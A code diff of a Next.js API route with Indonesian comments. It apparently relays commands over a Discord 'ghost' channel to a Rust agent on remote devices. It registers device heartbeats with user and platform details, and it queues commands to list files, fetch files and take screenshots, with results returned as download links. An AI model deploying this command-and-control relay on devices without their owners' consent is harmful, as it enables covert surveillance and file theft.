@@ -1,96 +1,127 @@
 import { NextRequest, NextResponse } from "next/server";
 import { discord } from "@/lib/discord-api-handler";
-import { sendMessage } from "@/lib/utils";
+import { sendMessage, sanitizeMessage } from "@/lib/utils";
 import { GHOST_CHANNEL_ID } from "@/lib/constants";
-import { sanitizeMessage } from "@/lib/utils";
 
-export const dynamic = "force-dynamic"; // Penting buat Vercel biar gak di-cache statis
+export const dynamic = "force-dynamic";
 
-// 1. GET: Dipanggil sama RUST Agent buat ngecek "Ada perintah gak?"
-export async function GET() {
-  try {
-    // Ambil pesan terakhir dari channel
-    const messages = await discord.get<any[]>(
-      `/channels/${GHOST_CHANNEL_ID}/messages?limit=1`,
-    );
+// ID Channel khusus untuk Registry Devices (Penting: Pisahkan dari command channel agar bersih)
+// Anda bisa membuat channel baru di Discord dan masukkan ID-nya di sini
+// Untuk sekarang kita pakai GHOST_CHANNEL_ID, tapi idealnya dipisah.
+// const REGISTRY_MESSAGE_ID_FILE = "device_registry.json"; // Virtual "file" name in Discord storage concept
 
-    if (!messages || messages.length === 0) {
-      return NextResponse.json({ command: null });
-    }
-
-    const latestMsg = messages[0];
-    const sanitized = sanitizeMessage(latestMsg);
-
-    // Cek apakah ini command yang belum dieksekusi (Status: PENDING)
-    // Kita pakai format JSON di content: { "status": "PENDING", "cmd": "GET_FILE:..." }
-    let content: any = sanitized.content;
-
-    // Safety check kalau content masih string (belum diparsing sanitizeMessage)
-    if (typeof content === "string") {
-      try {
-        content = JSON.parse(content);
-      } catch {
-        return NextResponse.json({ command: null });
-      }
-    }
-
-    if (content && content.status === "PENDING") {
-      // Tandai pesan sebagai PROCESSING biar gak diambil berkali-kali (opsional, atau Rust yang delete nanti)
-      // Disini kita kirim aja ke Rust
-      return NextResponse.json({
-        messageId: latestMsg.id,
-        command: content.cmd,
-      });
-    }
-
-    // Cek apakah ini RESULT dari Rust? (Link download)
-    if (content && content.status === "DONE") {
-      return NextResponse.json({
-        result: content.data, // Link download atau pesan error
-      });
-    }
-
-    return NextResponse.json({ command: null });
-  } catch (error) {
-    return NextResponse.json(
-      { error: "Failed to fetch commands" },
-      { status: 500 },
-    );
-  }
+// --- TYPES ---
+interface DeviceStatus {
+  id: string;
+  name: string;
+  ram_usage: number;
+  ram_total: number;
+  platform: string;
+  user: string;
+  last_seen: number;
 }
 
-// 2. POST: Dipanggil sama WEB UI buat naruh perintah ATAU Rust buat lapor hasil
+// 1. GET: Dipanggil Agent (Polling Command) ATAU Frontend (Fetch Devices)
+export async function GET(req: NextRequest) {
+  const { searchParams } = new URL(req.url);
+  const deviceId = searchParams.get("deviceId");
+  const action = searchParams.get("action");
+
+  // CASE A: Frontend minta daftar device
+  if (action === "list_devices") {
+    const devices = await getDeviceRegistry();
+    return NextResponse.json(devices);
+  }
+
+  // CASE B: Agent Polling Command
+  if (deviceId) {
+    try {
+      // Ambil pesan terakhir
+      const messages = await discord.get<any[]>(
+        `/channels/${GHOST_CHANNEL_ID}/messages?limit=5`,
+      );
+      if (!messages) return NextResponse.json(null);
+
+      // Cari command yang ditujukan untuk deviceID ini dan statusnya PENDING
+      for (const msg of messages) {
+        const sanitized = sanitizeMessage(msg);
+        let content: any = sanitized.content;
+
+        // Handle content if string
+        if (typeof content === "string") {
+          try {
+            content = JSON.parse(content);
+          } catch {
+            continue;
+          }
+        }
+
+        if (
+          content &&
+          content.target_id === deviceId &&
+          content.status === "PENDING"
+        ) {
+          return NextResponse.json({
+            messageId: msg.id,
+            command: content.cmd,
+            args: content.args,
+          });
+        }
+      }
+      return NextResponse.json(null);
+    } catch (error) {
+      return NextResponse.json(null);
+    }
+  }
+
+  return NextResponse.json({ error: "Invalid request" }, { status: 400 });
+}
+
+// 2. POST: Handle Heartbeat & Command Response
 export async function POST(req: NextRequest) {
   try {
     const body = await req.json();
 
-    // Skenario A: Web UI kirim perintah baru
-    if (body.action === "queue_command") {
+    // CASE A: Agent Heartbeat (Update Registry)
+    if (body.action === "heartbeat") {
+      await updateDeviceRegistry(body);
+      return NextResponse.json({ success: true });
+    }
+
+    // CASE B: Agent Responding to Command
+    if (body.action === "response") {
+      // Hapus pesan command (PENDING)
+      if (body.reply_to_id) {
+        await discord.delete(
+          `/channels/${GHOST_CHANNEL_ID}/messages/${body.reply_to_id}`,
+        );
+      }
+
+      // Post Result (Sebagai pesan baru bertipe RESULT)
       const payload = {
-        status: "PENDING",
-        cmd: body.command, // Contoh: "GET_FILE:D:\Tugas.zip"
+        type: "RESULT",
+        target_id: body.device_id,
+        status: body.status,
+        data: body.data,
         timestamp: Date.now(),
       };
 
+      // Kirim hasil ke channel biar Frontend bisa baca (polling di frontend)
       await sendMessage(GHOST_CHANNEL_ID, {
         content: `\`\`\`json\n${JSON.stringify(payload)}\n\`\`\``,
       });
 
-      return NextResponse.json({ success: true, status: "queued" });
+      return NextResponse.json({ success: true });
     }
 
-    // Skenario B: Rust Agent lapor tugas selesai (Kirim Link)
-    if (body.action === "report_result") {
-      // Hapus pesan perintah lama (opsional, biar bersih)
-      if (body.replyToId) {
-        await discord.delete(
-          `/channels/${GHOST_CHANNEL_ID}/messages/${body.replyToId}`,
-        );
-      }
-
+    // CASE C: Frontend Mengirim Command Baru
+    if (body.action === "queue_command") {
       const payload = {
-        status: "DONE",
-        data: body.data, // Link GoFile / Discord Attachment URL
+        status: "PENDING",
+        target_id: body.deviceId,
+        cmd: body.command, // "LS", "GET_FILE", "SCREENSHOT"
+        args: body.args || null,
+        timestamp: Date.now(),
       };
 
       await sendMessage(GHOST_CHANNEL_ID, {
@@ -102,6 +133,41 @@ export async function POST(req: NextRequest) {
 
     return NextResponse.json({ error: "Invalid action" }, { status: 400 });
   } catch (error) {
+    console.error(error);
     return NextResponse.json({ error: "Server error" }, { status: 500 });
   }
+}
+
+// --- HELPER: Device Registry (Mock DB in Memory / Discord Message) ---
+// Note: Idealnya pakai database beneran (Redis/Postgres).
+// Karena ini "Discord DBaaS", kita simpan state device di variable global serverless (ini bakal reset tiap cold boot Vercel),
+// ATAU kita bisa simpan di Discord message spesifik.
+// Untuk performa, kita pakai Global Cache + Discord Sync.
+
+let deviceCache: Record<string, DeviceStatus> = {};
+
+async function getDeviceRegistry() {
+  // Return cache for speed + online check logic
+  const now = Date.now();
+  const activeDevices = Object.values(deviceCache).map((d) => ({
+    ...d,
+    is_online: now - d.last_seen < 15000, // 15 detik timeout
+  }));
+  return activeDevices;
+}
+
+async function updateDeviceRegistry(data: any) {
+  deviceCache[data.device_id] = {
+    id: data.device_id,
+    name: data.device_name,
+    ram_usage: data.ram_usage,
+    ram_total: data.ram_total,
+    platform: data.platform,
+    user: data.user,
+    last_seen: Date.now(),
+  };
+  // Note: Di Vercel Serverless, cache ini hilang kalau idle.
+  // Jika butuh persistent, harus write ke Discord message (tapi rate limit bakal kena kalau heartbeat sering).
+  // Solusi: Agent heartbeat tiap 5s, tapi Next.js cuma update memori.
+  // UI akan request data ke Next.js.
 }
